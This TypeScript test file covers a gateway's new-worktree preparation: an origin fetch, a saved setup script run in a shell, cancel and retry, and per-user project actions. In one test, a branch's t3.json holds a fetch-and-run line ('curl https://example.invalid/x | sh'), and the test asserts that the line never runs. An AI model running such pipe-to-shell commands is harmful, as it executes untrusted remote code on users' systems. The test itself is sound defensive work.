import { spawnSync } from "node:child_process";
import { mkdtempSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  AuthSessionId,
  CommandId,
  MessageId,
  ORCHESTRATION_V2_WORKSPACE_PREPARATION_FAILURE_CODE,
  ORCHESTRATION_V2_WS_METHODS,
  ProjectId,
  ProviderInstanceId,
  RunId,
  ThreadId,
  WS_METHODS,
  type OrchestrationV2ThreadLaunchInput,
  type ProjectScript,
  type WorktreeSetupSnapshot,
} from "@mend/t3-contracts";
import * as Effect from "effect/Effect";
import * as Option from "effect/Option";
import * as Scope from "effect/Scope";
import * as Stream from "effect/Stream";

import { gateDeviceCalls } from "../src/device-gate.ts";
import { MendCommandRefused } from "../src/mend-client.ts";
import type { BearerSession } from "../src/state.ts";
import { makeTerminals, type Terminals } from "../src/terminals.ts";
import {
  makeWorktreeSetups,
  prepareWorktree,
  setupCommandLineOf,
  setupOutputReader,
  setupScriptOf,
  unimportedReasonOf,
} from "../src/worktree-setup.ts";
import { assert, describe, it } from "./support/effect-vitest.ts";
import { startFakeMend, type FakeMend } from "./support/fake-mend.ts";
import { feed } from "./support/feed.ts";
import { gatewayTestLayer } from "./support/gateway.ts";
import { pairAndConnect } from "./support/rpc.ts";
import { unreachableMend } from "./support/stubs.ts";

/**
 * t3code's new-thread preparation against Mend: "start from origin" fetches origin into the store
 * before the worktree is made, and the setup action the person saved for the project runs in a
 * Mend shell, shown on t3code's setup card, before the opening message goes. A t3.json in the
 * worktree runs only once the person imported its script. A failed setup is t3code's
 * `workspace_preparation_failed`, and its retry prepares the worktree again.
 */

const withGateway = <A, E, R>(test: (mend: FakeMend) => Effect.Effect<A, E, R>) =>
  Effect.gen(function* () {
    const mend = yield* startFakeMend;
    return yield* test(mend).pipe(Effect.scoped, Effect.provide(gatewayTestLayer(mend.url)));
  });

let commands = 0;
const commandId = () => CommandId.make(`setup-command-${++commands}`);

const THREAD = ThreadId.make("draft-setup");

const launchInput = (
  workspaceStrategy: OrchestrationV2ThreadLaunchInput["workspaceStrategy"] = {
    type: "worktree",
    baseRef: "main",
  },
): OrchestrationV2ThreadLaunchInput => ({
  commandId: commandId(),
  threadId: THREAD,
  projectId: ProjectId.make("project-1"),
  title: "Install and test",
  generateTitle: false,
  modelSelection: { instanceId: ProviderInstanceId.make("codex"), model: "gpt-6.1-sol" },
  runtimeMode: "full-access",
  interactionMode: "default",
  workspaceStrategy,
  initialMessage: {
    messageId: MessageId.make("message-setup"),
    text: "Run the tests",
    attachments: [],
  },
});

const t3json = (script: Record<string, unknown>) =>
  JSON.stringify({
    scripts: [
      { name: "Lint", command: "pnpm lint" },
      { name: "Install", command: "pnpm install", runOnWorktreeCreate: true, ...script },
    ],
  });

type GatewayRpc = Effect.Success<ReturnType<typeof pairAndConnect>>["rpc"];

const saveSetup = (rpc: GatewayRpc, script: Partial<ProjectScript> = {}) =>
  rpc[WS_METHODS.serverUpdateSettings]({
    patch: {
      projectScriptOverrides: {
        [ProjectId.make("project-1")]: [
          {
            id: "install",
            name: "Install",
            command: "pnpm install",
            icon: "configure",
            runOnWorktreeCreate: true,
            ...script,
          },
        ],
      },
    },
  });

const projectScripts = (rpc: GatewayRpc) =>
  rpc[ORCHESTRATION_V2_WS_METHODS.subscribeShell]({}).pipe(
    Stream.runHead,
    Effect.map((first) => {
      const item = Option.getOrUndefined(first);
      return item?.kind === "snapshot"
        ? (item.snapshot.projects.find((project) => project.id === "project-1")?.scripts ?? null)
        : null;
    }),
  );

const followUp = (text: string) =>
  ({
    type: "message.dispatch",
    commandId: commandId(),
    createdBy: "user",
    creationSource: "web",
    threadId: THREAD,
    messageId: MessageId.make(`follow-up-${++commands}`),
    text,
    attachments: [],
    dispatchMode: { type: "queue_after_active" },
  }) as const;

const calls = (mend: FakeMend, method: string, suffix: string) =>
  mend.workbench.calls.filter((call) => call.method === method && call.path.endsWith(suffix));

const eventually = (condition: () => boolean, what: string) =>
  Effect.gen(function* () {
    for (let attempt = 0; attempt < 200; attempt++) {
      if (condition()) return;
      yield* Effect.sleep("50 millis");
    }
    return yield* Effect.die(new Error(`Timed out waiting for ${what}.`));
  });

const stageOf = (snapshot: WorktreeSetupSnapshot, id: string) =>
  snapshot.stages.find((stage) => stage.id === id);

const isSnapshot =
  (accept: (snapshot: WorktreeSetupSnapshot) => boolean) =>
  (item: WorktreeSetupSnapshot | null): item is WorktreeSetupSnapshot =>
    item !== null && accept(item);

describe("start from origin", () => {
  it.live("fetches origin into the store before it makes the worktree, and only when asked", () =>
    withGateway((mend) =>
      Effect.gen(function* () {
        mend.workbench.addProject("project-1", "mend");
        const { rpc } = yield* pairAndConnect(mend, "ORIGIN");
        yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](
          launchInput({ type: "worktree", baseRef: "main", startFromOrigin: true }),
        );
        const order = mend.workbench.calls
          .filter((call) => call.method === "POST" && call.path.startsWith("/api/projects/"))
          .map((call) => call.path);
        assert.deepStrictEqual(order, [
          "/api/projects/project-1/refresh",
          "/api/projects/project-1/sessions",
        ]);

        yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread]({
          ...launchInput(),
          threadId: ThreadId.make("draft-local-base"),
        });
        assert.lengthOf(calls(mend, "POST", "/refresh"), 1);
        assert.lengthOf(calls(mend, "POST", "/projects/project-1/sessions"), 2);
      }),
    ),
  );
});

describe("a new worktree's setup script", () => {
  it.live(
    "runs the person's setup action in a Mend shell on the setup card, and holds the opening message until it exits",
    () =>
      withGateway((mend) =>
        Effect.gen(function* () {
          mend.workbench.addProject("project-1", "mend");
          mend.tty.scripts.set("pnpm install", {
            lines: ["Lockfile is up to date", "Done in 1.2s"],
            exitCode: 0,
            delayMs: 300,
          });
          const { rpc } = yield* pairAndConnect(mend, "SETUP");
          yield* saveSetup(rpc, { async: false });
          const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());

          const running = yield* card.next(
            isSnapshot((snapshot) => snapshot.setupScript !== null),
            "10 seconds",
          );
          assert.strictEqual(running.phase, "running");
          assert.deepStrictEqual(running.setupScript, {
            name: "Install",
            command: "pnpm install",
            terminalId: "setup-install",
          });
          assert.deepStrictEqual(
            running.stages.map((stage) => [stage.id, stage.status]),
            [
              ["fetch", "skipped"],
              ["checkout", "done"],
              ["setup-script", "running"],
              ["agent", "pending"],
            ],
          );
          assert.lengthOf(calls(mend, "POST", "/turns"), 0);

          const done = yield* card.next(
            isSnapshot((snapshot) => snapshot.phase === "done"),
            "10 seconds",
          );
          assert.deepStrictEqual(stageOf(done, "setup-script")?.tail, [
            "Lockfile is up to date",
            "Done in 1.2s",
          ]);
          assert.strictEqual(stageOf(done, "setup-script")?.detail, "exited with 0");
          assert.strictEqual(stageOf(done, "agent")?.status, "done");
          yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
          assert.deepStrictEqual(calls(mend, "POST", "/turns")[0]?.body, {
            input: "Run the tests",
          });

          assert.include(mend.tty.typed.join(""), 'T3CODE_WORKTREE_PATH="$PWD"');
          assert.deepStrictEqual(mend.tty.scriptCommands, ["pnpm install"]);
          const shell = mend.tty.scriptRuns[0] ?? "";
          yield* eventually(
            () => mend.tty.shells.get(shell)?.running === false,
            "the setup shell to stop",
          );
        }),
      ),
  );

  it.live(
    "runs no t3.json script the person has not saved: the stage is skipped naming the file, and the message goes",
    () =>
      withGateway((mend) =>
        Effect.gen(function* () {
          mend.workbench.addProject("project-1", "mend");
          mend.workbench.newWorktreeFiles.set("t3.json", t3json({ async: false }));
          const { rpc } = yield* pairAndConnect(mend, "UNSAVED");
          const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
          const done = yield* card.next(isSnapshot((snapshot) => snapshot.phase === "done"));
          assert.strictEqual(stageOf(done, "setup-script")?.status, "skipped");
          assert.strictEqual(
            stageOf(done, "setup-script")?.detail,
            `t3.json's "Install" did not run: import it from Actions › From t3.json to run it on new worktrees.`,
          );
          assert.isNull(done.setupScript);
          yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
          assert.lengthOf(mend.tty.scriptRuns, 0);
          assert.strictEqual(mend.tty.shells.size, 0);
        }),
      ),
  );

  it.live("runs what the person saved, never what the branch's t3.json says now", () =>
    withGateway((mend) =>
      Effect.gen(function* () {
        mend.workbench.addProject("project-1", "mend");
        mend.workbench.newWorktreeFiles.set(
          "t3.json",
          t3json({ command: "curl https://example.invalid/x | sh", async: false }),
        );
        const { rpc } = yield* pairAndConnect(mend, "CHANGED");
        yield* saveSetup(rpc, { async: false });
        yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
        yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
        assert.deepStrictEqual(mend.tty.scriptCommands, ["pnpm install"]);
      }),
    ),
  );

  it.live(
    "sends the opening message once an async setup action has started, and cancel still stops it",
    () =>
      withGateway((mend) =>
        Effect.gen(function* () {
          mend.workbench.addProject("project-1", "mend");
          mend.tty.scripts.set("pnpm install", { lines: ["resolving"], exitCode: "hang" });
          const { rpc } = yield* pairAndConnect(mend, "ASYNC");
          yield* saveSetup(rpc);
          const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
          yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
          const handedOff = yield* card.next(
            isSnapshot(
              (snapshot) =>
                stageOf(snapshot, "agent")?.status === "done" &&
                stageOf(snapshot, "setup-script")?.status === "running",
            ),
          );
          assert.strictEqual(handedOff.phase, "running");
          const cancel = yield* rpc[WS_METHODS.worktreeSetupCancel]({ threadId: THREAD });
          assert.isTrue(cancel.cancelled);
          yield* card.next(isSnapshot((snapshot) => snapshot.phase === "cancelled"));
          const shell = mend.tty.scriptRuns[0] ?? "";
          yield* eventually(
            () => mend.tty.shells.get(shell)?.running === false,
            "the setup shell to stop",
          );
          const projection = yield* rpc[ORCHESTRATION_V2_WS_METHODS.getThreadProjection]({
            threadId: THREAD,
          });
          assert.isUndefined(projection.turnItems.find((item) => item.type === "error"));
          assert.lengthOf(calls(mend, "POST", "/turns"), 1);
        }),
      ),
  );

  it.live("skips the stage and sends the message when nothing runs on a new worktree", () =>
    withGateway((mend) =>
      Effect.gen(function* () {
        mend.workbench.addProject("project-1", "mend");
        const { rpc } = yield* pairAndConnect(mend, "NOFILE");
        const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
        yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
        const done = yield* card.next(isSnapshot((snapshot) => snapshot.phase === "done"));
        assert.strictEqual(stageOf(done, "setup-script")?.status, "skipped");
        assert.strictEqual(
          stageOf(done, "setup-script")?.detail,
          "None of your actions runs on a new worktree.",
        );
        yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
        assert.lengthOf(mend.tty.scriptRuns, 0);
      }),
    ),
  );

  it.live(
    "fails the opening message as t3code's workspace preparation when the setup fails, and retry prepares it again",
    () =>
      withGateway((mend) =>
        Effect.gen(function* () {
          mend.workbench.addProject("project-1", "mend");
          mend.tty.scripts.set("pnpm install", {
            lines: ["ERR_PNPM_NO_LOCKFILE"],
            exitCode: 1,
          });
          const { rpc } = yield* pairAndConnect(mend, "FAILS");
          yield* saveSetup(rpc, { async: false });
          const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
          const launched = yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
          const runId = launched.projection.runs[0]?.id;
          assert.isDefined(runId);
          if (runId === undefined) return;
          assert.deepStrictEqual(launched.projection.runs[0]?.workspacePreparation, {
            type: "worktree",
            baseRef: "main",
          });

          const failed = yield* card.next(
            isSnapshot((snapshot) => snapshot.phase === "failed"),
            "10 seconds",
          );
          assert.strictEqual(failed.error, "Setup script exited with 1.");
          assert.strictEqual(stageOf(failed, "setup-script")?.status, "failed");

          const projection = yield* Effect.gen(function* () {
            for (;;) {
              const read = yield* rpc[ORCHESTRATION_V2_WS_METHODS.getThreadProjection]({
                threadId: THREAD,
              });
              if (read.runs[0]?.status === "failed") return read;
              yield* Effect.sleep("50 millis");
            }
          }).pipe(Effect.timeout("5 seconds"));
          const error = projection.turnItems.find((item) => item.type === "error");
          assert.isDefined(error);
          if (error?.type !== "error") return;
          assert.strictEqual(error.runId, runId);
          assert.strictEqual(
            error.failure.code,
            ORCHESTRATION_V2_WORKSPACE_PREPARATION_FAILURE_CODE,
          );
          assert.strictEqual(error.failure.message, "Setup script exited with 1.");
          assert.lengthOf(calls(mend, "POST", "/turns"), 0);

          mend.tty.scripts.set("pnpm install", { lines: ["Done"], exitCode: 0 });
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.dispatchCommand]({
            type: "prepared-run.retry",
            commandId: commandId(),
            threadId: THREAD,
            runId: RunId.make(runId),
          });
          const retried = yield* card.next(
            isSnapshot((snapshot) => snapshot.phase === "done"),
            "10 seconds",
          );
          assert.deepStrictEqual(
            retried.stages.map((stage) => stage.id),
            ["setup-script", "agent"],
          );
          yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
          assert.lengthOf(mend.tty.scriptRuns, 2);
          assert.strictEqual(mend.tty.scriptRuns[0], mend.tty.scriptRuns[1]);
          assert.strictEqual(mend.tty.shells.size, 1);
          assert.lengthOf(calls(mend, "POST", "/projects/project-1/sessions"), 1);
        }),
      ),
  );

  it.live("cancels a setup still running: its shell stops and the message fails, retryable", () =>
    withGateway((mend) =>
      Effect.gen(function* () {
        mend.workbench.addProject("project-1", "mend");
        mend.tty.scripts.set("pnpm install", { lines: ["fetching"], exitCode: "hang" });
        const { rpc } = yield* pairAndConnect(mend, "CANCEL");
        yield* saveSetup(rpc, { async: false });
        const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
        yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
        yield* card.next(
          isSnapshot((snapshot) => stageOf(snapshot, "setup-script")?.tail.length === 1),
          "10 seconds",
        );
        const cancel = yield* rpc[WS_METHODS.worktreeSetupCancel]({ threadId: THREAD });
        assert.isTrue(cancel.cancelled);
        yield* card.next(isSnapshot((snapshot) => snapshot.phase === "cancelled"));
        const shell = mend.tty.scriptRuns[0] ?? "";
        yield* eventually(
          () => mend.tty.shells.get(shell)?.running === false,
          "the setup shell to stop",
        );
        const projection = yield* rpc[ORCHESTRATION_V2_WS_METHODS.getThreadProjection]({
          threadId: THREAD,
        });
        const error = projection.turnItems.find((item) => item.type === "error");
        assert.strictEqual(
          error?.type === "error" ? error.failure.message : null,
          "Worktree setup cancelled.",
        );
        assert.strictEqual(
          error?.type === "error" ? error.failure.code : null,
          ORCHESTRATION_V2_WORKSPACE_PREPARATION_FAILURE_CODE,
        );
        assert.lengthOf(calls(mend, "POST", "/turns"), 0);
      }),
    ),
  );
});

describe("what a preparation holds back", () => {
  it.live("a launch with no message sends nothing the person adds until its setup ends", () =>
    withGateway((mend) =>
      Effect.gen(function* () {
        mend.workbench.addProject("project-1", "mend");
        mend.tty.scripts.set("pnpm install", { lines: ["linking"], exitCode: 0, delayMs: 1_500 });
        const { rpc } = yield* pairAndConnect(mend, "NOMESSAGE");
        yield* saveSetup(rpc, { async: false });
        const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
        const { initialMessage: _, ...withoutMessage } = launchInput();
        yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](withoutMessage);
        yield* eventually(() => mend.tty.scriptRuns.length === 1, "the setup script");
        yield* rpc[ORCHESTRATION_V2_WS_METHODS.dispatchCommand](followUp("Now the tests"));
        yield* Effect.sleep("500 millis");
        assert.lengthOf(calls(mend, "POST", "/turns"), 0);
        yield* card.next(
          isSnapshot((snapshot) => snapshot.phase === "done"),
          "10 seconds",
        );
        yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the follow-up");
        assert.deepStrictEqual(calls(mend, "POST", "/turns")[0]?.body, { input: "Now the tests" });
      }),
    ),
  );

  it.live(
    "taking back the opening message does not let a follow-up past a setup still running",
    () =>
      withGateway((mend) =>
        Effect.gen(function* () {
          mend.workbench.addProject("project-1", "mend");
          mend.tty.scripts.set("pnpm install", {
            lines: ["linking"],
            exitCode: 0,
            delayMs: 1_500,
          });
          const { rpc } = yield* pairAndConnect(mend, "TAKEBACK");
          yield* saveSetup(rpc, { async: false });
          const card = yield* feed(rpc[WS_METHODS.subscribeWorktreeSetup]({ threadId: THREAD }));
          const launched = yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
          const runId = launched.projection.runs[0]?.id;
          assert.isDefined(runId);
          if (runId === undefined) return;
          yield* eventually(() => mend.tty.scriptRuns.length === 1, "the setup script");
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.dispatchCommand]({
            type: "queued-run.cancel",
            commandId: commandId(),
            threadId: THREAD,
            runId,
          });
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.dispatchCommand](followUp("Only this one"));
          yield* Effect.sleep("500 millis");
          assert.lengthOf(calls(mend, "POST", "/turns"), 0);
          yield* card.next(
            isSnapshot((snapshot) => snapshot.phase === "done"),
            "10 seconds",
          );
          yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the follow-up");
          assert.deepStrictEqual(calls(mend, "POST", "/turns")[0]?.body, {
            input: "Only this one",
          });
        }),
      ),
  );
});

describe("project actions", () => {
  it.live(
    "keeps the actions a person imports, shows them as the project's scripts, and refuses other settings",
    () =>
      withGateway((mend) =>
        Effect.gen(function* () {
          mend.workbench.addProject("project-1", "mend");
          const { rpc } = yield* pairAndConnect(mend, "ACTIONS");
          const settings = yield* saveSetup(rpc, { async: false });
          assert.deepStrictEqual(settings.projectScriptOverrides, {});
          assert.deepStrictEqual(yield* projectScripts(rpc), [
            {
              id: "install",
              name: "Install",
              command: "pnpm install",
              icon: "configure",
              runOnWorktreeCreate: true,
              async: false,
            },
          ]);
          const other = yield* rpc[WS_METHODS.serverUpdateSettings]({
            patch: { defaultAutoPull: true },
          }).pipe(Effect.flip);
          assert.strictEqual(other._tag, "EnvironmentAuthorizationError");
          const mixed = yield* rpc[WS_METHODS.serverUpdateSettings]({
            patch: {
              defaultAutoPull: true,
              projectScriptOverrides: { [ProjectId.make("project-1")]: null },
            },
          }).pipe(Effect.flip);
          assert.strictEqual(mixed._tag, "EnvironmentAuthorizationError");

          yield* rpc[WS_METHODS.serverUpdateSettings]({
            patch: { projectScriptOverrides: { [ProjectId.make("project-1")]: null } },
          });
          assert.deepStrictEqual(yield* projectScripts(rpc), []);
        }),
      ),
  );

  it.live("keeps a person's actions across a restart, and never shows them to someone else", () => {
    const statePath = join(mkdtempSync(join(tmpdir(), "t3-gateway-actions-")), "state.sqlite");
    return Effect.gen(function* () {
      const mend = yield* startFakeMend;
      mend.workbench.addProject("project-1", "mend");
      yield* Effect.scoped(
        Effect.gen(function* () {
          const { rpc } = yield* pairAndConnect(mend, "KEEP");
          yield* saveSetup(rpc);
        }),
      ).pipe(Effect.provide(gatewayTestLayer(mend.url, statePath)));
      yield* Effect.scoped(
        Effect.gen(function* () {
          const { rpc } = yield* pairAndConnect(mend, "KEPT");
          const kept = yield* projectScripts(rpc);
          assert.deepStrictEqual(
            kept?.map((script) => script.command),
            ["pnpm install"],
          );
          const other = yield* pairAndConnect(mend, "OTHER", {
            id: "user-2",
            name: "Grace",
            email: "grace@example.com",
          });
          assert.deepStrictEqual(yield* projectScripts(other.rpc), []);
        }),
      ).pipe(Effect.provide(gatewayTestLayer(mend.url, statePath)));
    });
  });
});

describe("a preparation across a restart", () => {
  it.live("fails what a restart cut short as a preparation, and its retry prepares again", () => {
    const statePath = join(mkdtempSync(join(tmpdir(), "t3-gateway-setup-")), "state.sqlite");
    return Effect.gen(function* () {
      const mend = yield* startFakeMend;
      mend.workbench.addProject("project-1", "mend");
      mend.tty.scripts.set("pnpm install", { lines: ["fetching"], exitCode: "hang" });
      yield* Effect.scoped(
        Effect.gen(function* () {
          const { rpc } = yield* pairAndConnect(mend, "BEFORE");
          yield* saveSetup(rpc, { async: false });
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.launchThread](launchInput());
          yield* eventually(() => mend.tty.scriptRuns.length === 1, "the setup script");
        }),
      ).pipe(Effect.provide(gatewayTestLayer(mend.url, statePath)));

      mend.tty.scripts.set("pnpm install", { lines: ["Done"], exitCode: 0 });
      yield* Effect.scoped(
        Effect.gen(function* () {
          const { rpc } = yield* pairAndConnect(mend, "AFTER");
          const projection = yield* rpc[ORCHESTRATION_V2_WS_METHODS.getThreadProjection]({
            threadId: THREAD,
          });
          const run = projection.runs[0];
          assert.strictEqual(run?.status, "failed");
          assert.deepStrictEqual(run?.workspacePreparation, { type: "worktree", baseRef: "main" });
          const error = projection.turnItems.find((item) => item.type === "error");
          assert.strictEqual(
            error?.type === "error" ? error.failure.code : null,
            ORCHESTRATION_V2_WORKSPACE_PREPARATION_FAILURE_CODE,
          );
          if (run === undefined) return;
          yield* rpc[ORCHESTRATION_V2_WS_METHODS.dispatchCommand]({
            type: "prepared-run.retry",
            commandId: commandId(),
            threadId: THREAD,
            runId: run.id,
          });
          yield* eventually(() => calls(mend, "POST", "/turns").length === 1, "the opening turn");
        }),
      ).pipe(Effect.provide(gatewayTestLayer(mend.url, statePath)));
    });
  });
});

describe("the hand-off", () => {
  const SESSION: BearerSession = {
    sessionId: AuthSessionId.make("bearer-1"),
    tokenHash: "hash",
    deviceToken: "mdt_token",
    mendUser: { id: "user-1", name: "Ada", email: "ada@example.com" },
    mendDeviceId: "device-1",
    scopes: [],
    client: { label: null, deviceType: "desktop", os: null },
    issuedAt: 0,
    expiresAt: Number.MAX_SAFE_INTEGER,
    revokedAt: null,
  };

  it.effect("hands nothing off when the shell does not take the typed script", () =>
    Effect.gen(function* () {
      const scope = yield* Scope.Scope;
      const mend = gateDeviceCalls(
        {
          ...unreachableMend,
          launchProtocol: () =>
            Effect.fail(
              new MendCommandRefused({
                operation: "POST /api/sessions/:id/launch",
                status: 422,
                tag: null,
                detail: null,
              }),
            ),
        },
        () => Effect.void,
      );
      const real = makeTerminals({
        mend,
        mendUrl: new URL("http://127.0.0.1:0"),
        threadSession: () => Effect.succeed(null),
      });
      const terminals: Terminals = {
        ...real,
        open: (_session, input) =>
          Effect.succeed({
            threadId: input.threadId,
            terminalId: input.terminalId,
            cwd: input.cwd ?? "/workspace",
            worktreePath: null,
            status: "running",
            pid: null,
            history: "",
            exitCode: null,
            exitSignal: null,
            label: "shell",
            updatedAt: "2026-10-17T12:00:00.000Z",
          }),
        processOf: () => "process-1",
        write: (input) => real.write(input),
      };
      const settled: Array<string | null> = [];
      const setups = makeWorktreeSetups(scope);
      yield* setups.begin({
        threadId: "thread-1",
        branch: null,
        baseRef: "main",
        stages: ["setup-script", "agent"],
      });
      yield* prepareWorktree(
        {
          mend,
          terminals,
          setups,
          worktreeOf: () =>
            Effect.succeed({ worktreeId: "worktree-1", worktreePath: "/workspace" }),
          setupScriptOf: () =>
            Effect.succeed({
              id: "install",
              name: "Install",
              command: "pnpm install",
              icon: "configure",
              runOnWorktreeCreate: true,
            }),
          launchUnderWay: () => Effect.succeed("2026-10-17T12:00:00.000Z"),
          refresh: () => Effect.void,
          setupProcessOpened: () => Effect.void,
          settle: (_preparation, failure) => Effect.sync(() => settled.push(failure)),
        },
        {
          session: SESSION,
          threadId: "thread-1",
          sessionId: "session-1",
          projectId: "project-1",
          runId: "run-1",
          options: {},
          staleProcessId: null,
        },
      );
      assert.deepStrictEqual(settled, ["The gateway could not type the setup script."]);
    }),
  );
});

const action = (name: string, runOnWorktreeCreate: boolean): ProjectScript => ({
  id: name.toLowerCase(),
  name,
  command: `pnpm ${name.toLowerCase()}`,
  icon: "play",
  runOnWorktreeCreate,
});

describe("the setup script's source and output", () => {
  it("runs the first action marked to run on a new worktree, and says why a t3.json one did not", () => {
    assert.strictEqual(
      setupScriptOf([action("Lint", false), action("Install", true), action("Seed", true)])?.name,
      "Install",
    );
    assert.isNull(setupScriptOf([action("Lint", false)]));
    assert.strictEqual(
      unimportedReasonOf(t3json({})),
      `t3.json's "Install" did not run: import it from Actions › From t3.json to run it on new worktrees.`,
    );
    assert.strictEqual(unimportedReasonOf(null), "None of your actions runs on a new worktree.");
    assert.strictEqual(
      unimportedReasonOf("{ not json"),
      "None of your actions runs on a new worktree.",
    );
    assert.strictEqual(
      unimportedReasonOf(JSON.stringify({ scripts: [] })),
      "None of your actions runs on a new worktree.",
    );
  });

  const shellsOnPath = ["bash", "zsh", "fish", "dash", "sh"].flatMap((name) => {
    const found = spawnSync("sh", ["-c", `command -v ${name}`], { encoding: "utf8" });
    return found.status === 0 ? [{ name, path: found.stdout.trim() }] : [];
  });
  const posixShell = shellsOnPath.find((shell) => shell.name === "bash") ?? shellsOnPath[0];
  const SCRIPT = [
    `printf 'quote %s\n' "it's"`,
    `cat <<'EOF'`,
    `heredoc $HOME stays`,
    `EOF`,
    `echo "back\\slash" # a comment at the end`,
    `echo "root=$T3CODE_PROJECT_ROOT"`,
    `exit 3`,
  ].join("\n");

  it.each(shellsOnPath.map((shell) => [shell.name, shell.path] as const))(
    "runs a script typed into %s and reads back only its lines and its exit",
    (_name, path) => {
      const token = "tok3n";
      const line = setupCommandLineOf(SCRIPT, token);
      const cwd = mkdtempSync(join(tmpdir(), "t3-gateway-wrapper-"));
      const typed = spawnSync(path, ["-c", line.replace(/\r$/, "")], {
        cwd,
        encoding: "utf8",
        env: {
          PATH: process.env["PATH"] ?? "",
          HOME: "/home/nobody",
          SHELL: posixShell?.path ?? "sh",
        },
      });
      const read = setupOutputReader(token)(`${line}\r\n${typed.stdout}`);
      assert.deepStrictEqual(read.lines, [
        "quote it's",
        "heredoc $HOME stays",
        "back\\slash",
        `root=${realpathSync(cwd)}`,
      ]);
      assert.strictEqual(read.exitCode, 3);
    },
  );

  const fish = shellsOnPath.find((shell) => shell.name === "fish");
  it.skipIf(fish === undefined)("runs the script under the workspace's own shell: fish", () => {
    const token = "fishy";
    const line = setupCommandLineOf(
      "set -l greeting hello\necho $greeting from fish\nexit 4",
      token,
    );
    const typed = spawnSync(fish?.path ?? "fish", ["-c", line.replace(/\r$/, "")], {
      encoding: "utf8",
      env: { PATH: process.env["PATH"] ?? "", SHELL: fish?.path ?? "fish" },
    });
    const read = setupOutputReader(token)(typed.stdout);
    assert.deepStrictEqual(read.lines, ["hello from fish"]);
    assert.strictEqual(read.exitCode, 4);
  });

  it("reads the script's own lines and its exit, never the shell's echo of what was typed", () => {
    const token = "abc123";
    const line = setupCommandLineOf("pnpm install\necho done", token);
    const read = setupOutputReader(token);
    // A shell echoes the typed line after its prompt; a line editor may draw a space as a cursor
    // move, which stripping removes, so the echo is fed with its spaces gone too.
    const echo = read(`$ ${line.replace(/\r$/, "")}\r\n${line.replaceAll(" ", "\x1b[C")}\r\n`);
    assert.deepStrictEqual(echo.lines, []);
    assert.isUndefined(echo.exitCode);
    const output = read(
      `__T3_SETUP_START__${token}\r\n\x1b[32mProgress: resolved 12\x1b[0m\r\nProgress: resolved 40\rdone\r\n`,
    );
    assert.deepStrictEqual(output.lines, [
      "Progress: resolved 12",
      "Progress: resolved 40",
      "done",
    ]);
    assert.isUndefined(read("__T3_SETUP_DONE__other:0\r\n").exitCode);
    assert.strictEqual(read(`\r\n__T3_SETUP_DONE__${token}:3\r\n$ `).exitCode, 3);
  });
});
